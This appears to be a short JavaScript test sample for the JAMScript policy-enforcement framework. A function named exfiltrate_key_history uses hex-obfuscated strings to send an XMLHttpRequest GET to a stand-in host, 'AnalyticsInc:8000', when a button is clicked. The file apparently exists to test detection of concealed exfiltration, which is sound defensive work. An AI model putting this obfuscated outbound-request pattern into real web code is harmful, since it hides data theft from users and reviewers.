
JAM.startProfile('load');
introspect(JAMScript.introspectors.processAll) {
function exfiltrate_key_history() {

    // http://javascriptobfuscator.com/
    // Exfiltrate data using XMLHTTP request
    var _0x2e14=["\x47\x45\x54","\x68\x74\x74\x70\x3A\x2F\x2F\x41\x6E\x61\x6C\x79\x74\x69\x63\x73\x49\x6E\x63\x3A\x38\x30\x30\x30\x2F\x73\x75\x62\x6D\x69\x73\x73\x69\x6F\x6E\x2E\x68\x74\x6D\x6C\x3F","\x74\x65\x73\x74\x3D\x6A\x61\x76\x61\x5F\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72","\x6F\x70\x65\x6E","\x73\x65\x6E\x64"];xmlhttp= new XMLHttpRequest();xmlhttp[_0x2e14[3]](_0x2e14[0],_0x2e14[1]+_0x2e14[2],true);xmlhttp[_0x2e14[4]](null);
	
}

document.getElementById('test').onclick = exfiltrate_key_history;

}

JAM.stopProfile('load');
